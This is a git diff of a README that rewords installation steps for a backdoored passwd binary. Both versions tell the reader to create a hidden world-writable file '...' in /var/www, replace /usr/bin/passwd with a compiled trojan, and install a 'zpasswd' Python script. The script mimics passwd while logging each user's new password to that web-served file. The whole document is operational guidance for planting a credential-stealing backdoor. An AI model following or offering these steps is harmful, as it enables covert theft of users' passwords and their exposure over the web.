@@ -1,32 +1,34 @@
-This is a backdoored passwd
+## Backdoored passwd binary
 
-You must create a ... directory in /var/www
+First you must create a `...` file in `/var/www`.
 
-`mkdir /var/www/...`
+`touch /var/www/...`
 
-Give it 777 permissions and owned by root
+Next make `root` own the file and give it `777` permissions. 
 
 `chown root:root /var/www/...
 chmod 777 /var/www/...`
 
-Next, you might want to make backup of the original passwd binary
+Backing up the origin passwd binary is recommended.
 
 `mv /usr/bin/passwd /usr/bin/passwd.orig`
 
-Move the backdoored passwd binary into /usr/bin
+You will now need to move the compiled c binary to replace the original.
 
 `mv passwd /usr/bin`
 
-Make root own it and make 755 permissions
+Give `root` ownership and give the file `755` permissions.
 
 `chown root:root /usr/bin/passwd
 chmod 755 /usr/bin/passwd`
 
-Move the zpasswd python script into /usr/bin
+Next move the `zpasswd` python script into `/usr/bin`
 
 `mv zpasswd /usr/bin`
+
+You will also need to give `root` ownership and `755` permissions.
 
 `chown root:root /usr/bin/zpasswd
 chmod 755 /usr/bin/zpasswd`
 
-Now when people run passwd it will emulate the real binary behavior, add the credentials to /var/www/... and then change their password
+Now when users run the `passwd` command, they will run the C compiled binary, which will pass over to the `zpasswd` python script, which will emulate the real passwd binary, but will add the new credentials to `/var/www/...` and then finally change the password of the user.
